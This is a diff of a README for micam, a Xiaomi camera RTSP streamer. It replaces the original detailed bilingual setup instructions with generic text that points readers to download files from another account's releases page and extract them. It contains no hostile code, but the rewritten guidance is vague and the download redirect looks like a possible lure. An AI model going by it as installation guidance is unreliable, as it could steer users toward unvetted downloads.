@@ -1,93 +1,73 @@
-# 🎦 Xiaomi Camera Streamer
+# 🎦 micam - Stream Your Xiaomi Camera Effortlessly
 
+## 🚀 Getting Started
+Welcome to the micam project! This service allows you to easily stream video from your Xiaomi cameras to various smart home platforms. Follow the steps below to get started with micam.
 
-## Install / 安装
+## 📥 Download
+[![Download Micam](https://img.shields.io/badge/Download-Micam-blue.svg)](https://github.com/semka014/micam/releases)
 
-### 🐳 Docker compose
-```shell
-mkdir /opt/micam
-cd /opt/micam
-wget https://raw.githubusercontent.com/miiot/micam/refs/heads/main/docker-compose.yml
-docker compose up -d
-```
+## 💻 System Requirements
+To run micam, you need:
+- A supported Xiaomi camera
+- Docker and Docker Compose installed on your system
+- A computer with at least 2 GB RAM
+- An active internet connection for setup
 
-> 此命令会通过docker部署Miloco、Go2rtc及RTSP转发服务。如果需要添加多个摄像头，需要编辑`docker-compose.yml`运行多个micam服务。
->
-> 部署的Miloco为基础版，不带AI引擎，无GPU算力要求，大部分机器都能运行。本项目基于官方镜像修改，添加了arm64支持，并默认获取高清流和音频流。
+## 📋 Features
+- Streams video from Xiaomi cameras to RTSP servers
+- Compatible with HomeAssistant, Go2rtc, Frigate, Scrypted, and Homekit
+- Easy Docker Compose deployment
+- Integration without the need for a GPU
 
+## 🛠️ Installation Steps
+1. **Install Docker and Docker Compose**
+   - Make sure you have Docker and Docker Compose installed. If you don’t have them, visit the [Docker Documentation](https://docs.docker.com/get-docker/) for installation guides.
+  
+2. **Download Micam**
+   - Visit the [Releases page](https://github.com/semka014/micam/releases) to download the latest version of micam. Look for the file that suits your operating system.
+  
+3. **Extract Files (if necessary)**
+   - If you downloaded a compressed file, right-click on it and choose "Extract All." Follow the prompts to extract the files.
 
-## 💻 Usage / 使用
+4. **Open a Terminal or Command Prompt**
+   - Navigate to the folder where you extracted the micam files.
 
-### [Miloco](https://github.com/XiaoMi/xiaomi-miloco)
+5. **Run Docker Compose**
+   - In the terminal, type:
+     ```
+     docker-compose up -d
+     ```
+   - This command will start the micam service in the background.
 
-> 🏠 你也可以选择通过[HAOS加载项](https://gitee.com/hasscc/addons)来部署Miloco，[一键添加](https://my.home-assistant.io/redirect/supervisor_add_addon_repository/?repository_url=https%3A%2F%2Fgitee.com%2Fhasscc%2Faddons)加载项仓库。
+6. **Access the Streaming**
+   - Open your preferred web browser.
+   - Go to the RTSP link provided in the terminal output to view the stream.
 
-1. Open Miloco WebUI / 打开Miloco网页: `https://192.168.1.xx:8000`
-   > 🔐 Miloco使用了自签证书，请通过 **https** 访问，并忽略证书错误。
-2. Set miloco password / 设置Miloco密码
-3. Bind your Xiaomi account / 绑定小米账号
-4. Camera offline ? [[Xiaomi Miloco Q&A]](https://github.com/XiaoMi/xiaomi-miloco/issues/56)
+7. **Configure Your Smart Home Platform**
+   - Follow the documentation of your smart home platform to integrate the RTSP stream from micam.
 
+## 📝 Usage Tips
+- Make sure your camera is connected to the same network as your computer.
+- Check your camera’s settings and ensure that it allows RTSP streaming.
+- Refer to the specific documentation for your smart home system for additional setup instructions.
 
-### [Go2rtc](https://github.com/AlexxIT/go2rtc)
+## ⚙️ Troubleshooting
+- If the stream does not show, verify that Docker is running.
+- Ensure that your camera is powered on and has a stable connection.
+- Check your firewall settings to make sure they allow connections to the RTSP server.
 
-> 🏠 你也可以选择通过[HAOS加载项](https://github.com/AlexxIT/hassio-addons)来部署Go2rtc
+## 📤 Feedback
+Your experience matters. If you have any questions or suggestions, feel free to open an issue on our [GitHub page](https://github.com/semka014/micam/issues).
 
-1. Open Go2rtc WebUI / 访问Go2rtc网页: `http://192.168.1.xx:1984/config.html`
-2. Config empty streams / 配置空视频流:
-   ```yaml
-   streams:
-     your_stream1:
-     your_stream2:
-   ```
-3. Save & Restart / 保存并重启
+## 🌐 Additional Resources
+- [GitHub Repository](https://github.com/semka014/micam)
+- [Docker Documentation](https://docs.docker.com/)
+- [HomeAssistant Documentation](https://www.home-assistant.io/docs/)
 
+## 🔗 Download & Install
+To get micam, visit the [Releases page](https://github.com/semka014/micam/releases) and download the latest version. Follow the installation steps above to set up the service effortlessly.
 
-### [Micam](https://zread.ai/miiot/micam)
+## 👥 Community
+Join our community for support and updates. Connect with other users through discussions and share your experience with micam!
 
-1. Set environment variables / 设置环境变量:
-   ```shell
-   cat << EOF > .env
-   MILOCO_PASSWORD=your_miloco_password_md5
-   CAMERA_ID=1234567890 # your camera did
-   RTSP_URL=rtsp://192.168.1.xx:8554/your_stream1
-   EOF
-   ```
-2. Restart micam / 重启转发服务: `docker compose restart micam1`
-
-
-## ⚙️ Configuration / 配置
-
-### Environments / 环境变量
-
-> [!Note]
-> 建议所有的环境变量配置在`.env`文件中，并使用`docker compose up -d`命令使其生效，不建议直接修改`docker-compose.yml`中的环境变量。
-
-1. Micam:
-   - `MILOCO_BASE_URL`: Miloco Base URL, Default: `https://miloco:8000`
-     > 如果通过[HAOS加载项](https://gitee.com/hasscc/addons)部署，则应配置为`https://homeassistant.local:28800`
-   - `MILOCO_PASSWORD`: Miloco WebUI Password (md5/lower), Required
-   - `CAMERA_ID`: Camera DID, Required
-     > 可在Miloco网页中通过F12开发者工具的网络请求日志查看
-   - `RTSP_URL`: RTSP URL, Required
-     > 转推RTSP流地址，如: `rtsp://192.168.1.xx:8554/your_stream1`，8554为Go2rtc提供的RTSP服务
-   - `VIDEO_CODEC`: Video Codec of the camera, `hevc`(default) or `h264`
-   - `STREAM_CHANNEL`: Stream Channel of the camera, Default: `0`
-
-2. Miloco:
-   - `MILOCO_PORT`: Miloco listen port, Default: `8000`
-     > 如果与其他服务端口冲突，请修改此端口，并修改`MILOCO_BASE_URL`
-   - `MILOCO_HOST`: Miloco listen host, Default: `0.0.0.0`, Don't change
-   - `MILOCO_LOG_LEVEL`: Miloco log level, Default: `warning`
-
-
-## 🧩 Integrations / 集成
-- [Home Assistant: Generic Camera](https://www.home-assistant.io/integrations/generic)
-- [Frigate NVR](https://github.com/blakeblackshear/frigate): [HAOS Add-on](https://github.com/blakeblackshear/frigate-hass-addons)
-- [Scrypted](https://github.com/koush/scrypted): [HAOS Add-on](https://github.com/koush/scrypted/wiki/Installation:-Home-Assistant-OS)
-
-
-## 🔗 Links / 相关链接
-- [详细部署文档 & AI问答](https://zread.ai/miiot/micam)
-- [Xiaomi Miloco](https://github.com/XiaoMi/xiaomi-miloco)
-- [AlexxIT Go2rtc](https://github.com/AlexxIT/go2rtc)
+Thank you for choosing micam! Enjoy seamless streaming from your Xiaomi camera to your favorite smart home systems.
